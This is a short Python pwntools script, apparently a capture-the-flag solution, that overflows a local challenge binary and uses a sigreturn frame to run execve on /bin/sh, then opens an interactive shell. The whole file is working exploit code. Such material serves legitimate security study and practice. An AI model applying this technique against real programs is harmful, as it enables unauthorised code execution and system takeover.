from pwn import *


def main():
    context.arch = 'amd64'

    # Launch the binary
    chal_binary = './src//chal.out'
    io = process(chal_binary)
    io.readuntil('Good luck!\n')

    # Get addresses
    e = ELF(chal_binary)
    rax_gad = e.symbols['set_eax']
    syscall_gad = e.symbols['fire'] + 4
    binsh = e.search("/bin/sh").next()

    # Construct pl (part 1)
    pl = 'A' * cyclic_find('faaa')
    pl += p64(rax_gad)
    pl += p64(syscall_gad)

    # Construct the sigreturn frame to call /bin/sh
    frame = SigreturnFrame(kernel='amd64')
    frame.rip = syscall_gad
    frame.rdi = binsh
    frame.rax = 59

    # Finish pl
    pl += str(frame)

    # Deliver the pl to win
    io.write(pl)
    print 'Congrats! You now have a shell!'
    io.interactive()


if __name__ == '__main__':
    main()
